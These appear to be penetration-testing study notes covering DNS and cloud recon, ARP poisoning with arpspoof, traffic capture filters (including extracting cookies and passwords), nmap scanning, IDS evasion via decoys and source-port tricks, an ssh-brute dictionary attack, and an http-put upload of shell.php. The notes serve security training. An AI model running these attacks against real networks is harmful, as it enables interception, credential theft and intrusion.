        Lookup DNS MX   records 	dig @1.1.1.1 tryhackme.com MX
        Lookup DNS TXT  records 	dig tryhackme.com TXT
	All information with host 	host -a tryhackme.com
	All information with dig 	dig +nocmd google.com any +noall +answer
	Trace option			dig google.com +trace
	Reverse DNS lookup		dig -x 217.76.132.194
		who.is
		whois request
		https://archive.org/web/
		http://www.hosterstats.com/
		https://intodns.com/
		https://www.domaintools.com/
		https://www.nslookup.io/
		http://mxtoolbox.com/
		https://toolbox.googleapps.com/apps/dig/
* Cloud resources
	 > The configurations made by the administrators may nevertheless make the company's cloud resources vulnerable. This often starts with the S3 buckets (AWS), blobs (Azure), cloud storage (GCP), which can be accessed without authentication if configured incorrectly.
	 > Often cloud storage is added to the DNS list when used for administrative purposes by other employees. This step makes it much easier for the employees to reach and manage them. Let us stay with the case that a company has contracted us, and during the IP lookup, we have already seen that one IP address belongs to the s3-website-us-west-2.amazonaws.com server.
	[+] However, there are many different ways to find such cloud storage. One of the easiest and most used is Google search combined with Google Dorks. For example, we can use the Google Dorks inurl: and intext: to narrow our search to specific terms. In the following example, we see red censored areas containing the company name
		> Google search for AWS
			intext:inlane.com inurl:amazonaws.com
		> Google search for Azure
			intext:inlane.com inurl:blob.core.windows.net
	> Third-party providers can also tell us a lot about the company's infrastructure. 
		https://domain.glass/
		https://buckets.grayhatwarfare.com/ ==> We can do many different searches, discover AWS, Azure, and GCP cloud storage, and even sort and filter by file format. Therefore, once we have found them through Google, we can also search for them on GrayHatWarefare and passively discover what files are stored on the given cloud storage
* Staff
	> Sites :
		- Linkedin
			About: Aj
		- Xing
	



* Example after recollecting DNS enumeration
	> For example, Atlassian states that the company uses this solution for software development and collaboration. If we are not familiar with this platform, we can try it for free to get acquainted with it.
	> Google Gmail indicates that Google is used for email management. Therefore, it can also suggest that we could access open GDrive folders or files with a link.
	> LogMeIn is a central place that regulates and manages remote access on many different levels. However, the centralization of such operations is a double-edged sword. If access as an administrator to this platform is obtained (e.g., through password reuse), one also has complete access to all systems and information.
	> Mailgun offers several email APIs, SMTP relays, and webhooks with which emails can be managed. This tells us to keep our eyes open for API interfaces that we can then test for various vulnerabilities such as IDOR, SSRF, POST, PUT requests, and many other attacks.
	> Outlook is another indicator for document management. Companies often use Office 365 with OneDrive and cloud resources such as Azure blob and file storage. Azure file storage can be very interesting because it works with the SMB protocol.
	> The last thing we see is INWX. This company seems to be a hosting provider where domains can be purchased and registered. The TXT record with the "MS" value is often used to confirm the domain. In most cases, it is similar to the username or ID used to log in to the management platform.
	
###ARP
* Arp
	opcode=1 for request 
	opcode=2 for reply
* Tools 
	sudo arp-scan -I ens33 -g 192.168.188.0/24
* Check arp
	> Linux 
		ip neighbour
	> Windows 
		arp -a 
	> Mac OS 
		arp
[+] ARP poisoning
	> What is and what you can do?
		> The attacker can manipulate other host's ARP cache by sending gratuitous ARP replies (unsolicited ARP replies). The atacker sends a reply without waiting for a host to perform a request.
	    	> The attacker can prevent the poisoned entry from expiring by sending gratuitous ARP replies every 30 seconds or so.
	    	> As soon as the attacker's machine receives the packets, it must forward them to the correct destination. Otherwise, the communication between the victim hosts will not work. 
	    	> This operation lets the hacker:
	    		Sniff traffic between the poisoned hosts even if the machines sit on a switched network
	    	   	Change the content of the packets thus manipulating the information exchanged by the two parties.
	    	> This kind of attack can be even used on a entire network and against a router, letting an attacker intercept the communication between a LAN and the Internet.
	
	> Tools
		apt get install dsniff: Collection of tools for network auditing and penetration test. 
		> Before running the tool, you have to enable the Linux Kernel IP Forwarding (this feature transforms a Linux box into a router. This tell your machine to forward the packets you intercept to the real destination host)
			echo 1 > /proc/sys/net/ipv4/ip_forward 
	      		arpspoof -i <interface> -t <target> -r <host>


###Traffic Analysis
	> wireshark
		Open wireshark and see the mac addresses with Statistics => Endpoints 
  		wireshark -i tun0 ==> follow TCP stream
  	  	http contains bee #For example
  	  	ip.addr == 192.168.45.64
  	  	ip.src
  	  	ip.dst
  	  	tcp.port eq
  		ip: Only packets using IP as layer 3 protocol
  		not ip: The opposite of the previous syntax | not arp and !(udp.port == 53)
  		http.request.method==GET
  		tcp port 80: Packes where the source or destination TCP port is 80
  		net 192.168.54.0/24: Packets from and to the specified network
  		src port 1234: The source port must be 1234;the transport protocol does not matter
  		src net 192.168.1.0/24: The source IP address must be in the specified network
  		host 192.168.45.65: All the packets from or to the specified host
  		host www.examplehost.com: All the packets from or to the specified hostname
  		eth.dst == [MAC.ADDRESS] #Useful to know how many routers are there
  		tcp.stream eq 0
		opcode=1 for request 
		opcode=2 for reply
  		Relative sequence numbers 
      		Protocol Hierarchy. Navigate to Statistics > Protocol Hierarchy.
      		Export HTTP Object navigate to file > Export Objects > HTTP //To see if anything is different
      		To use the Endpoints feature navigate to Statistics > Endpoints
      		HTTPS
      			Client and server agree on a protocol version
      		    	Client and server select a cryptographic algorithm
      		    	The client and server can authenticate to each other; this step is optional
      		    	Creates a secure tunnel with a public key
      		    	To load an RSA key navigate to Edit > Preferences > Protocols > TLS
	> tshark
		tshark -D
  		tshark -i ens33
  		tshark -r HTTP_traffic.pcap
  		tshark -r HTTP_traffic.pcap -c 100 //Read the first 100 packets
  		tshark -r HTTP_traffic.pcap -z io,phs -q  
  		tshark -r HTTP_traffic.pcap -z io,phs arp
  		tshark -r HTTP_traffic.pcap -Y 'ip contains amazon.in && ip.src==192.168.252.128' -Tfields e ip.src -e http.cookie
  		tshark -r HTTP_traffic.pcap -Y 'ip.src==192.168.252.128 && http' -Tfields -e http.user_agent
  		tshark -r HTTP_traffic.pcap -Y 'http'
  		tshark -r HTTP_traffic.pcap -Y 'http contains password'
  		tshark -r HTTP_traffic.pcap -Y 'http.request.method==GET'
  		tshark -r HTTP_traffic.pcap -Y 'http.request.method==GET' -Tfields -e frame.time -e ip.src -e http.request.full_uri
  		tshark -r HTTP_traffic.pcap -Y 'http.request.method==GET && http.host==www.nytimes.com' -Tfields -e ip.dst
  		tshark -r HTTP_traffic.pcap -Y 'ip.src=192.168.188.126 && ip.dst=34.45.62.56'

###WiFi Traffic Analysis
		wireshark
    			Protocol Hierarchy ==> 802.11
    		  	(wlan.fc.type_subtype==0x0008) && !(wlan.wfa.ie.wpa.version==1) && !(wlan.tag.number==48) //Beacon frame && not wpa1 && not Robust Security Network interface // Open SSIDs
    		  	  wlan.fixed.capabilities.privacy==0 
    		  	wlan contains Home_Network
    		  	(wlan.ssid contains Amazon) && (wlan.fc.type_subtype == 0x0008) //To know if WPA is enabled
    		  	(wlan.ta == e8:de:27:16:87:18) || (wlan.ra == e8:de:27:16:87:18) //How many packets has transmited and recieved this MAC
    		  	((wlan.bssid==e8:de:27:16:87:18) && (wlan.fc.type_subtype==0x0020))
    		  	(((wlan.bssid==e8:de:27:16:87:18)) && (wlan.addr == 5c:51:88:31:a0:3b)) && (wlan.fc.type_subtype==0x0001) //Association Response 
    		tshark 
    		  	tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype==0x000c' //Deauthentication packets
    		  	tshark -r WiFi_traffic.pcap -Y 'eapol' //Only display WPA handshake packets
    		  	tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype==8' -Tfields -e wlan.ssid -e wlan.bssid //Only SSID and BSSID values for all beacon frames
    		  	tshark -r WiFi_traffic.pcap -Y 'wlan.ssid==LazyArtists' -Tfields -e wlan.bssid
    		  	tshark -r WiFi_traffic.pcap -Y 'wlan.ssid==Home_Network' -Tfields -e wlan_radio.channel
    		  	tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype==0x000c' -Tfields -e wlan.ra
    		  	tshark -r WiFi_traffic.pcap -Y 'wlan.ta==5c:51:88:31:a0:3b && http' -Tfields -e http.user_agent
###masscan
* You could perform host discovery using masscan and then conduct a detailed scan with nmap against certain interesting hosts
	masscan -p22,80,443,53,3389,8080,445 -Pn --rate=800 --banners 192.168.188.0/24 -e tun0 --router-ip 192.168.188.133.1 --echo > massscan.conf
* You could edit 'massscan.conf' and add format = list

###NMAP
* If our target sends an SYN-ACK flagged packet back to the scanned port, Nmap detects that the port is open.
* If the packet receives an RST flag, it is an indicator that the port is closed.
* If Nmap does not receive a packet back, it will display it as filtered. Depending on the firewall configuration, certain packets may be dropped or ignored by the firewall.
[+] NMAP options
	Host discovery
    	Port scanning
    	Service enumeration and detection
    	OS detection
    	Scriptable interaction with the target service (Nmap Scripting Engine)
## Scanning Options
| **Nmap Option** | **Description** |
|---|----|
| `10.10.10.0/24` | Target network range. |
| `-sn` | Disables port scanning. |
| `-Pn` | Disables ICMP Echo Requests |
| `-n` | Disables DNS Resolution. |
| `-PE` | Performs the ping scan by using ICMP Echo Requests against the target. |
| `--packet-trace` | Shows all packets sent and received. |
| `--reason` | Displays the reason for a specific result. |
| `--disable-arp-ping` | Disables ARP Ping Requests. |
| `--top-ports=<num>` | Scans the specified top ports that have been defined as most frequent.  |
| `-p-` | Scan all ports. |
| `-p22-110` | Scan all ports between 22 and 110. |
| `-p22,25` | Scans only the specified ports 22 and 25. |
| `-F` | Scans top 100 ports. |
| `-sS` | Performs an TCP SYN-Scan. |
| `-sA` | Performs an TCP ACK-Scan. |
| `-sU` | Performs an UDP Scan. |
| `-sV` | Scans the discovered services for their versions. |
| `-sC` | Perform a Script Scan with scripts that are categorized as "default". |
| `--script <script>` | Performs a Script Scan by using the specified scripts. |
| `-O` | Performs an OS Detection Scan to determine the OS of the target. |
| `-A` | Performs OS Detection, Service Detection, and traceroute scans. |
| `-D RND:5` | Sets the number of random Decoys that will be used to scan the target. |
| `-e` | Specifies the network interface that is used for the scan. |
| `-S 10.10.10.200` | Specifies the source IP address for the scan. |
| `-g` | Specifies the source port for the scan. |
| `--dns-server <ns>` | DNS resolution is performed by using a specified name server. |
## Output Options
| **Nmap Option** | **Description** |
|---|----|
| `-oA filename` | Stores the results in all available formats starting with the name of "filename". |
| `-oN filename` | Stores the results in normal format with the name "filename". |
| `-oG filename` | Stores the results in "grepable" format with the name of "filename". |
| `-oX filename` | Stores the results in XML format with the name of "filename". |
## Performance Options
| **Nmap Option** | **Description** |
|---|----|
| `--max-retries <num>` | Sets the number of retries for scans of specific ports. |
| `--stats-every=5s` | Displays scan's status every 5 seconds. |
| `-v/-vv` | Displays verbose output during the scan. |
| `--initial-rtt-timeout 50ms` | Sets the specified time value as initial RTT timeout. |
| `--max-rtt-timeout 100ms` | Sets the specified time value as maximum RTT timeout. |
| `--min-rate 300` | Sets the number of packets that will be sent simultaneously. |
| `-T <0-5>` | Specifies the specific timing template. |
####Host discovery
* Nmap
	nmap -v -oG - ==> Since no target is specified, the scan will fail but will show the ports scanned.
	sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5 ==> Scan network range
		> This scanning method works only if the firewalls of the hosts allow it. Otherwise, we can use other scanning techniques to find out if the hosts are active or not
		> If we disable port scan (-sn), Nmap automatically ping scan with ICMP Echo Requests (-PE). Once such a request is sent, we usually expect an ICMP reply if the pinging host is alive. The more interesting fact is that our previous scans did not do that because before Nmap could send an ICMP echo request, it would send an ARP ping resulting in an ARP reply. We can confirm this with the "--packet-trace" option. To ensure that ICMP echo requests are sent, we also define the option (-PE) for this.
		> Another way to determine why Nmap has our target marked as "alive" is with the "--reason" option.
		> We see here that Nmap does indeed detect whether the host is alive or not through the ARP request and ARP reply alone. To disable ARP requests and scan our target with the desired ICMP echo requests, we can disable ARP pings by setting the "--disable-arp-ping" option. Then we can scan our target again and look at the packets sent and received.
		> An ICMP echo request can help us determine if our target is alive and identify its system. More strategies about host discovery can be found at:
			https://nmap.org/book/host-discovery-strategies.html
				--source-port <portnum> (same as -g) ==> Some naive firewall administrators make a ruleset exception in order to keep DNS (port 53) or FTP-DATA (port 20) working. Of course this opens a hole big enough to drive an Nmap ping scan through
				--date-length <length> ==> This helps make the scan less conspicuous and more like the packets generated by the ubiquitous ping diagnostics program. Several intrusion detection systems (IDS), including Snort, have alerts for zero-byte ping packets. This option evades those alerts. An option value of 32 makes an echo request look more like it came from Windows, while 56 simulates the default Linux ping.
				--ttl <value> ==>  Reducing the outgoing TTL with --ttl helps to reduce router CPU load when loops are encountered.
				--max-rtt-timeout <time> ==>  These options control how long Nmap waits for a ping response.
				--reason ==> The normal Nmap output indicates whether a host is up or not, but does not describe which discovery test(s) the host responded to. For this detail, add the --reason option. The results can be confusing for host discovery since Nmap does not always try every probe. It stops as soon as it gets a first response. So Nmap might report an ICMP echo response from a host during the run, but then a RST response might be received first during a second run and lead Nmap to report that.
				--packet-trace ==>  This option shows every packet send and received by Nmap, including details such as sequence numbers, TTL values, and TCP flags.
	nmap -sn 192.168.188.0/24 [No port scan]
		-sn: Ping scan - disable port scan
    		nmap -sn 200.200.0.0/16
    		nmap -sn 200.200.123.1-12
    		nmap -sn 172.16.12.*
    		nmap -sn 200.200.12-13.*
    		nmap -sn 10.10.*.1
    		nmap -sn 10.14.33.1,3,17
    		nmap -sn 10.14,20.3.1,3,17,233
	nmap -sP 192.188.164.0/24
		-sP: Disable port scanning
		!! => Good option to start in a LAN. Like using -sn
	
* netdiscover
	sudo netdiscover -i ens33 -r 192.168.188.0/24
* ICMP  Type 8 - echo requests
	Type 0 - echo reply 
* fping -a -g IPRANGE  
	-a: Show only alive hosts  
	-g: Ping sweep instead of a standard ping
	fping -a -g 10.54.12.0/24
  	fping -a -g 10.54.12.0 10.54.12.255 2>/dev/null
       	fping -I ens33 -g 192.168.188.0/24 -a 2>/dev/null
* Concept: 
	ping : for one host
    	fping : multiple hosts
####Port scanning and another options
* The STATE heading confirms that these ports are open. Sometimes we will see other ports listed that have a different state, such as filtered. This can happen if a firewall is only allowing access to the ports from specific addresses.
* The SERVICE heading tells us the service's name is typically mapped to the specific port number. However, the default scan will not tell us what is listening on that port. Until we instruct Nmap to interact with the service and attempt to tease out identifying information, it could be another service altogether.
* 	State		Description
	open		This indicates that the connection to the scanned port has been established. These connections can be TCP connections, UDP datagrams as well as SCTP associations.
	closed		When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an RST flag. This scanning method can also be used to determine if our target is alive or not.
	filtered	Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target.
	unfiltered	This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed.
	open|filtered	If we do not get a response for a specific port, Nmap will set it to that state. This indicates that a firewall or packet filter may protect the port.
	closed|filtered	This state only occurs in the IP ID idle scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall.
* By default, Nmap scans the top 1000 TCP ports with the SYN scan (-sS). This SYN scan is set only to default 'when we run it as root' because of the socket permissions required to create raw TCP packets. Otherwise, the TCP scan (-sT) is performed by default
* Port Scanning 
	--top-ports=10
	-F : Top 100 ports
	-n : No DNS resolution
	--disable-arp-ping: Disables ARP ping scan
	--packet-trace ==> Shows all packets sent and received
	-sL: List scan - simply list targets to scan
  	-iL: Input from list of hosts/networks
	-Pn: Treats all hosts as online not only those responding to ping. Skip host discovery. 
	-sT ==>	It is useful when we want to map the network and don't want to disturb the services running behind it, thus causing a minimal impact and sometimes considered a more polite scan method. It is also useful when the target host has a personal firewall that drops incoming packets but allows outgoing packets. In this case, a Connect scan can bypass the firewall and accurately determine the state of the target ports. However, it is important to note that the Connect scan is slower than other types of scans because it requires the scanner to wait for a response from the target after each packet it sends, which could take some time if the target is busy or unresponsive.
			sudo nmap 10.129.2.28 -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT 
			sudo nmap 10.129.2.28 -p 139 --packet-trace -n --disable-arp-ping -Pn
		> If we get an ICMP response with error code 3 (port unreachable), we know that the port is indeed closed.
			sudo nmap 10.129.2.28 -sU -Pn -n --disable-arp-ping --packet-trace -p 100 --reason
	--max-retries ==> By default is set to 1
	--traceroute
	-PA port list: TCP ACK Ping
	-PB: Use ACK and ICMP echo in parallel
	-PE: Use a true ping
	-PM: Use a netmask request
	-PP: Use an ICMP timestamp request 
	-PS: Use SYN packets instead of ACK
	-PU port list: UDP ping 
	-PY port list: SCTP INIT Ping
	-P0: IP Protocol Ping
      	-Pn 10.4.19.218 ==> Windows usually blocks ping probes. So -Pn is necessary. Applicable to Windows targets. Treat all hosts as online - skip host discovery. Disables ICMP echo requests
      	-F 10.4.19.218 ==> Fast scan
      	-sU 10.4.19.218 ==> UDP scan
        nmap 192.206.172.3 -p 134,177,234 -sUV --script=discovery
      	-sV : Version ==>  The version scan is underpinned by a comprehensive database of over 1,000 service signatures
      	-sC : List of nmap scripts to enumerate more information. 
      	-A  : Combine -sV, -O and -sC
      	-oX : xml format. Valid for metasploit
		xsltproc target.xml -o target.html ==> To report
		xmllint --format --html - ==> To terminal 
      	--top-port 25
####Service scanning
* Options
	--stats-every=5s or 1m
* If there is PHP ==> index.php
* Banner grabbing ==> nc -nv 10.129.42.23 21
			nmap -sV --script=banner -p21 10.10.10.0/24
			whatweb 138.68.143.219
			whatweb --no-errors 10.10.10.0/24
		> One disadvantage to Nmap's presented results is that the automatic scan can miss some information because sometimes Nmap does not know how to handle it. Let us look at an example of this.
			> If we look at the results from Nmap, we can see the port's status, service name, and hostname. Nevertheless, let us look at this line here:
    				NSOCK INFO [0.4200s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 18 [10.129.2.28:25] (35 bytes): 220 inlane ESMTP Postfix (Ubuntu)..
			> Then we see that the SMTP server on our target gave us more information than Nmap showed us. Because here, we see that it is the Linux distribution Ubuntu. It happens because, after a successful three-way handshake, the server often sends a banner for identification. This serves to let the client know which service it is working with. At the network level, this happens with a PSH flag in the TCP header. However, it can happen that some services do not immediately provide such information. It is also possible to remove or manipulate the banners from the respective services. If we manually connect to the SMTP server using nc, grab the banner, and intercept the network traffic using tcpdump, we can see what Nmap did not show us.
				sudo tcpdump -i eth0 host 10.10.14.2 and 10.129.2.28
				nc -nv 10.129.2.28 25
					> The first three lines show us the three-way handshake.
						1.	[SYN]	18:28:07.128564 IP 10.10.14.2.59618 > 10.129.2.28.smtp: Flags [S], <SNIP>
						2.	[SYN-ACK]	18:28:07.255151 IP 10.129.2.28.smtp > 10.10.14.2.59618: Flags [S.], <SNIP>
						3.	[ACK]	18:28:07.255281 IP 10.10.14.2.59618 > 10.129.2.28.smtp: Flags [.], <SNIP>
					> After that, the target SMTP server sends us a TCP packet with the PSH and ACK flags, where PSH states that the target server is sending data to us and with ACK simultaneously informs us that all required data has been sent.
						4. 	[PSH-ACK] 	18:28:07.319306 IP 10.129.2.28.smtp > 10.10.14.2.59618: Flags [P.], <SNIP>
					> The last TCP packet that we sent confirms the receipt of the data with an ACK.
						5. 	[ACK] 	18:28:07.319426 IP 10.10.14.2.59618 > 10.129.2.28.smtp: Flags [.], <SNIP>
* Tools
	https://github.com/FortyNorthSecurity/EyeWitness ==> Which can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.

####OS detection:
* On every network node ==> routers, firewalls, hosts, servers, printers and so on.
* Passive => You can perform OS fingerprint on a traffic capture you recorded 
* Active  => By using nmang -g p or other similar tools 
	-g/--source-port <portnum>: Use given port number
	-O: Enable OS detection
	--osscan-limit: Limit OS detection to promising targets //If you have to scan thousands of hosts you could at first limit OS reconnaissance to just the promising ones.
	--osscan-guess: Guess OS more aggressively

####Scan types:
* SYN scans are the default scans used by Nmap if run with sudo permissions. If run without sudo permissions, Nmap defaults to the TCP Connect scan 
	-sT: TCP connect scan. This type of scan gets recorded in the application logs.
	-sU: UDP scan. It's usually used with --top-ports [20 for example]
	-sS: SYN scan. A well-configured IDS will still detect the scan
	-sV: Version detection scan. Nmap performs a TCP connect scan and reads from the banner of the daemon listening on a port. This is not stealthy but very useful.
	-sN: TCP Null scans. When the TCP request is sent with no flags set at all. As per the RFC, the target host should respond with a RST if the port is closed.
	-sF: TCP FIN scans. Instead of sending a completely empty packet, a request is sent with the FIN flag (usually used to gracefully close an active connection). Once again, Nmap expects a RST if the port is closed.
	-sX: TCP Xmas scans. Send a malformed TCP packet and expects a RST response for closed ports. It's referred to as an xmas scan as the flags that it sets (PSH, URG and FIN)
* Specifying targets by DNS name
	nmap <scan type> target1.domain.com target2.otherdomain.com

#####Spotting a firewall
* You might often see that a version was not recognized regardless of the open port or that even the service type is not recognized. For example, 'tcpwrapped' means that the TCP handshake was completed but the remote host closed the connection without receiving any data.
* Using --reason. 
	-f:- Used to fragment the packets (i.e. split them into smaller pieces) making it less likely that the packets will be detected by a firewall or IDS.
        An alternative to -f, but providing more control over the size of the packets: 
	--mtu <number>, accepts a maximum transmission unit size to use for the packets sent. This must be a multiple of 8.
    	--scan-delay <time>ms:- used to add a delay between packets sent. This is very useful if the network is unstable, but also for evading any time-based firewall/IDS triggers which may be in place.
    	--badsum:- this is used to generate in invalid checksum for packets. Any real TCP/IP stack would drop this packet, however, firewalls may potentially respond automatically, without bothering to check the checksum of the packet. As such, this switch can be used to determine the presence of a firewall/IDS.

####Firewall and IDS/IPS evasion
* Nmap's TCP ACK scan (-sA) method is much harder to filter for firewalls and IDS/IPS systems than regular SYN (-sS) or Connect scans (sT) because they only send a TCP packet with only the ACK flag. When a port is closed or open, the host must respond with an RST flag. Unlike outgoing connections, all connection attempts (with the SYN flag) from external networks are usually blocked by firewalls. However, the packets with the ACK flag are often passed by the firewall because the firewall cannot determine whether the connection was first established from the external network or the internal network.
	sudo nmap 10.129.2.28 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace
* Example
	> Pay attention to the RCVD packets and its set flag we receive from our target. With the SYN scan (-sS) our target tries to establish the TCP connection by sending a packet back with the SYN-ACK (SA) flags set and with the ACK scan (-sA) we get the RST flag because TCP port 22 is open. For the TCP port 25, we do not receive any packets back, which indicates that the packets will be dropped.
* VPS: Several virtual private servers (VPS) with different IP addresses are recommended to determine whether such systems like IDS or IPS are on the target network during a penetration test
* Decoys
	> There are cases in which administrators block specific subnets from different regions in principle. This prevents any access to the target network. Another example is when IPS should block us. For this reason, the Decoy scanning method (-D) is the right choice. With this method, Nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent. With this method, we can generate random (RND) a specific number (for example: 5) of IP addresses separated by a colon (:). Our real IP address is then randomly placed between the generated IP addresses. In the next example, our real IP address is therefore placed in the second position. Another critical point is that the decoys must be alive. Otherwise, the service on the target may be unreachable due to SYN-flooding security mechanisms.
	sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5
	> The spoofed packets are often filtered out by ISPs and routers, even though they come from the same network range. Therefore, we can also specify our VPS servers' IP addresses and use them in combination with "IP ID" manipulation in the IP headers to scan the target.
	> Another scenario would be that only individual subnets would not have access to the server's specific services. So we can also manually specify the source IP address (-S) to test if we get better results with this one. Decoys can be used for SYN, ACK, ICMP scans, and OS detection scans
		sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0
* DNS proxying
	> By default, Nmap performs a reverse DNS resolution unless otherwise specified to find more important information about our target. These DNS queries are also passed in most cases because the given web server is supposed to be found and visited. The DNS queries are made over the UDP port 53. The TCP port 53 was previously only used for the so-called "Zone transfers" between the DNS servers or data transfer larger than 512 bytes. More and more, this is changing due to IPv6 and DNSSEC expansions. These changes cause many DNS requests to be made via TCP port 53.
	> However, Nmap still gives us a way to specify DNS servers ourselves (--dns-server <ns>,<ns>). This method could be fundamental to us if we are in a demilitarized zone (DMZ). The company's DNS servers are usually more trusted than those from the Internet. So, for example, we could use them to interact with the hosts of the internal network. As another example, we can use TCP port 53 as a source port (--source-port) for our scans. If the administrator uses the firewall to control this port and does not filter IDS/IPS properly, our TCP packets will be trusted and passed through.
		sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53
	> Now that we have found out that the firewall accepts TCP port 53, it is very likely that IDS/IPS filters might also be configured much weaker than others. We can test this by trying to connect to this port by using Netcat.
		ncat -nv --source-port 53 10.129.2.28 50000

####Ports
	-p-: All ports
	-p 21,22,80 
	-p 100-200
	nmap -p- 192.188.164.1,2,3,4,5,6 or 192.188.164.1-6
####Nmap scripting engine
* Category	Description
	auth		Determination of authentication credentials.
	broadcast	Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.
	brute		Executes scripts that try to log in to the respective service by brute-forcing with credentials.
	default		Default scripts executed by using the -sC option.
	discovery	Evaluation of accessible services.
	dos		These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.
	exploit		This category of scripts tries to exploit known vulnerabilities for the scanned port.
	external	Scripts that use external services for further processing.
	fuzzer		This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.
	intrusive	Intrusive scripts that could negatively affect the target system.
	malware		Checks if some malware infects the target system.
	safe		Defensive scripts that do not perform intrusive and destructive access.
	version		Extension for service detection.
	vuln		Identification of specific vulnerabilities.
* Default scripts
	sudo nmap <target> -sC
* Specified scripts category
	sudo nmap <target> --script <category>
	sudo nmap 10.129.2.28 -p 80 -sV --script vuln
* Defined scripts
	sudo nmap <target> --script <script-name>,<script-name>,...
	sudo nmap 10.129.2.28 -p 25 --script banner,smtp-commands
####Performance
* Timeouts
	> When Nmap sends a packet, it takes some time (Round-Trip-Time - RTT) to receive a response from the scanned port. Generally, Nmap starts with a high timeout (--min-RTT-timeout) of 100ms.
	> Default scan
		sudo nmap 10.129.2.0/24 -F
		<SNIP>
		Nmap done: 256 IP addresses (10 hosts up) scanned in 39.44 seconds
	> Optimized RTT
		sudo nmap 10.129.2.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms
		<SNIP>
		Nmap done: 256 IP addresses (8 hosts up) scanned in 12.29 seconds
	> From this, we can conclude that setting the initial RTT timeout (--initial-rtt-timeout) to too short a time period may cause us to overlook hosts.
* Max retries
	> Another way to increase the scans' speed is to specify the retry rate of the sent packets (--max-retries). The default value for the retry rate is 10, so if Nmap does not receive a response for a port, it will not send any more packets to the port and will be skipped.
	> Default scan
		sudo nmap 10.129.2.0/24 -F | grep "/tcp" | wc -l
		23
	> Reduced retries
		sudo nmap 10.129.2.0/24 -F --max-retries 0 | grep "/tcp" | wc -l
		21
	> Again, we recognize that accelerating can also have a negative effect on our results, which means we can overlook important information.
* Rates	
	> During a white-box penetration test, we may get whitelisted for the security systems to check the systems in the network for vulnerabilities and not only test the protection measures. If we know the network bandwidth, we can work with the rate of packets sent, which significantly speeds up our scans with Nmap. When setting the minimum rate (--min-rate <number>) for sending packets, we tell Nmap to simultaneously send the specified number of packets. It will attempt to maintain the rate accordingly.
	> Default scan
		sudo nmap 10.129.2.0/24 -F -oN tnet.default
		<SNIP>
		Nmap done: 256 IP addresses (10 hosts up) scanned in 29.83 seconds
	> Optimized scan
		sudo nmap 10.129.2.0/24 -F -oN tnet.minrate300 --min-rate 300
		<SNIP>
		Nmap done: 256 IP addresses (10 hosts up) scanned in 8.67 seconds
* Timing
> The default timing template used when we have defined nothing else is the normal (-T 3)
	T 0 / -T paranoid
	T 1 / -T sneaky
    	T 2 / -T polite
    	T 3 / -T normal
    	T 4 / -T aggressive
    	T 5 / -T insane




####Others nmap 
	-oA: Output in the three major formats at once
	-A: Enable OS detection, version detection, script scanning, and traceroute
* Scripts
	/usr/share/nmap/scripts/script.db and nmap --script-updatedb
	nmap -sV --script=http-enum
* Dictionary attack by ssh
	nmap -p22 --script ssh-brute --script-args userdb=./username.lst,passdb=/usr/share/nmap/nselib/data/password.lst demo.ine.local
* Example
	--script=vuln: Activate all the scripts in the vuln category
	iptables -I INPUT -p tcp --dport <port> -j REJECT --reject-with tcp-reset: Configure the firewall to respond with a RST TCP packet

* Categories of scripts:   https://nmap.org/book/nse-usage.html

	nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php' : Example
-=-=

###Footprinting, scanning & enumeration
####SMB, Samba & NetBIOS [RPC included]
* Servers and clients use NetBIOS (Network Basic Input Output System) when viewing network shares on the LAN. NetBIOS can supply some of the following information when querying a computer:
    	> Hostname
    	> NetBIOS name
    	> Domain
    	> Network shares
* NetBIOS layer sits between the application layer and the IP layer
    	> UDP port 137 ==> NetBIOS names resolution. To find workgroups
    	> UDP port 138 ==> NetBIOS datagrams. A host can send small messages to many other hosts. To list the shares and the machines
    	> TCP port 139 ==> NetBIOS session. Heavy traffic, such as a file copy. To transmit data to and from a Windows share
* SMB
	> In IP networks, SMB uses TCP protocol for this purpose, which provides for a three-way handshake between client and server before a connection is finally established. The specifications of the TCP protocol also govern the subsequent transport of data. We can take a look at some examples here ==> https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-SMB2/%5bMS-SMB2%5d.pdf#%5B%7B%22num%22%3A920%2C%22gen%22%3A0%7D%2C%7B%22name%22%3A%22XYZ%22%7D%2C69%2C738%2C0%5D
	> An SMB server can provide arbitrary parts of its local file system as shares. Therefore the hierarchy visible to a client is partially independent of the structure on the server. Access rights are defined by Access Control Lists (ACL). They can be controlled in a fine-grained manner based on attributes such as execute, read, and full access for individual users or user groups. The ACLs are defined based on the shares and therefore do not correspond to the rights assigned locally on the server.

	> Originally, SMB ran on top of NetBIOS using port 139
      	The SMB protocol utilizes two levels of authentication(Both of these authentication levels utilize a challenge response authentication system), namely:
      		+ User authentication: Users must provide a username and password in order to authenticate with the SMB server in order to access a share
      	  	+ Share authentication: Users must provide a password in order to access restricted share
* Samba
